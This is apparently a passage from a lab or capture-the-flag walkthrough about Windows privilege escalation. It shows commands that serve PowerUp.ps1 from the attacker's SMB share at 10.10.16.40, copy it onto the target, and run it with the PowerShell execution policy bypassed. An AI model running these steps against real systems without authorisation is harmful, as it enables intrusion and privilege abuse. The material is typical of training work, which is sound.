PrivEsc

I wanted to use PowerUp.ps1 for finding vector for privilege escalation, however, when I launched powershell, command line freezed. So, I will use it with Load and Run technique.

First, we need to install PowerUp.ps1 to the target machine. For that, I will use impacket-smbserver.

└─$ impacket-smbserver share . -smb2support -username a -password a On a dir you installed PowerUp.ps1


C:\ProgramData> net use \\10.10.16.40 /user:a a
C:\ProgramData> copy \\10.10.16.40\share\PowerUp.ps1

C:\ProgramData> powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module .\PowerUp.ps1; Invoke-AllChecks | Out-File C:\Users\Public\powerup-checks.txt -Encoding ASCII"
